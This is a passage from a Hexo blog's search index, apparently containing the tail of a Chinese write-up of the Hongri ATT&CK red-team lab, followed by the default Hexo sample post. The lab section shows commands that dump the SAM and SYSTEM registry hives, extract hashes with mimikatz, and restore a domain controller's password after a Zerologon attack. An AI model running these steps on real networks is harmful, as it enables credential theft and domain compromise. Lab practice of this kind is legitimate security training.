alt="image-20220220044545851"></p><p>上线成功了就是获取注册表转储文件，如果中文报错不影响使用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;reg save HKLM\SYSTEM system.hive /y    </span><br><span class="line">C:\&gt;reg save HKLM\SAM sam.hive /y </span><br></pre></td></tr></table></figure><p>下载到本地之后使用mimikatz即可提取DC机器用户的hash</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></figure><p><img src="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220220050042702.png" alt="image-20220220050042702"></p><p>这里的hash虽然和我们获取到的域管理员hash一致但实际上这是域控的机器账号，只是密码一样。</p><p>最后一步就是恢复hash了。</p><p>这里就需要用到<a href="https://github.com/risksense/zerologon%E9%87%8C%E9%9D%A2%E7%9A%84reinstall_original_pw.py%E4%BA%86%E3%80%82%E7%BC%96%E8%AF%91%E6%88%90exe(%E6%9C%8912m%E7%9C%9F%E5%AE%9E%E7%8E%AF%E5%A2%83%E5%8F%AF%E8%83%BD%E9%9A%BE%E5%8F%97)%E5%90%8E%E7%9B%B4%E6%8E%A5%E4%B8%A2%E5%9C%A8web%E8%BF%99%E5%8F%B0%E6%9C%BA%E5%99%A8%E4%B8%8A%E6%89%A7%E8%A1%8C%E5%8D%B3%E5%8F%AF%E3%80%82%E9%81%BF%E5%85%8Dpython%E7%8E%AF%E5%A2%83%E8%BF%98%E9%9C%80%E8%A6%81%E4%BB%A3%E7%90%86%E5%87%BA%E6%9D%A5%E3%80%82">https://github.com/risksense/zerologon里面的reinstall_original_pw.py了。编译成exe(有12m真实环境可能难受)后直接丢在web这台机器上执行即可。避免python环境还需要代理出来。</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reinstall_original_pw.exe DC <span class="number">10.10</span>.<span class="number">10.10</span> <span class="number">161</span>cff084477fe596a5db81874498a24</span><br></pre></td></tr></table></figure><p><img src="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220220050621332.png" alt="image-20220220050621332"></p><h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p>其他东西换靶场玩，靶场练手但是尽可能贴近实战去操作，方法选择较多选择实战更方便的。</p>]]></content>
      
      
      <categories>
          
          <category> 红日靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文章示例</title>
      <link href="/2022/02/11/hello-world/"/>
      <url>/2022/02/11/hello-world/</url>
      
        <content type="html"><![CDATA[<p>hexo g编译<br>hexo d上传<br>hexo s运行</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> Baz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Foo </tag>
            
            <tag> Bar </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
